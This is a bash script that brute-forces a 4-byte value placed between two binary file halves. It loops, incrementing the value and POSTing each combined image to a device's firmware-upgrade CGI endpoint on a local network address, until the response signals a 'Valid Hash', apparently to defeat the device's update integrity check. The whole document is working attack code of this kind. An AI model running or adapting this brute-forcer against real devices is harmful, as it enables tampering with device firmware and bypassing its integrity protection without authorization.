#!/bin/bash

# Controll if only one input
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <4-byte-hex> <file1.bin> <file2.bin>"
    exit 1
fi
stopimus=0
#start hex
hexus=$1
output_file="output.bin"
file1=$2
file2=$3
# Controll Hex length
if [ "${#hexus}" -ne 8 ]; then
    echo "The hex value must be exactly 4 bytes (8 hex characters)."
    exit 1
fi
addone () {
	hexus=$(printf "%08x" $((0x$hexus + 1)))
}
while [ "$stopimus" -ne 1 ]; do
	echo "$hexus" #original input
	#do other script stuff
	#combine files with hexus
	cat "$file1" <(echo -n "$hexus" | xxd -r -p) "$file2" > "$output_file"
	curl -s  -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTcr4UUOOVuhK6DX2" --data-binary @output.bin --output -  http://192.168.0.239/httpupg.cgi?cmd=bruteforeceUwU > response.txt
	if grep -q -a "effect" response.txt ; then
		echo "Valid Hash"
	stopimus=$((stopimus + 1))
	elif grep -q -a "error" response.txt; then
		echo "Womp Womp not Valid"
	else
		echo "Error have fun fixing it"
	fi
	addone
	#stopimus=$((stopimus + 1))
done
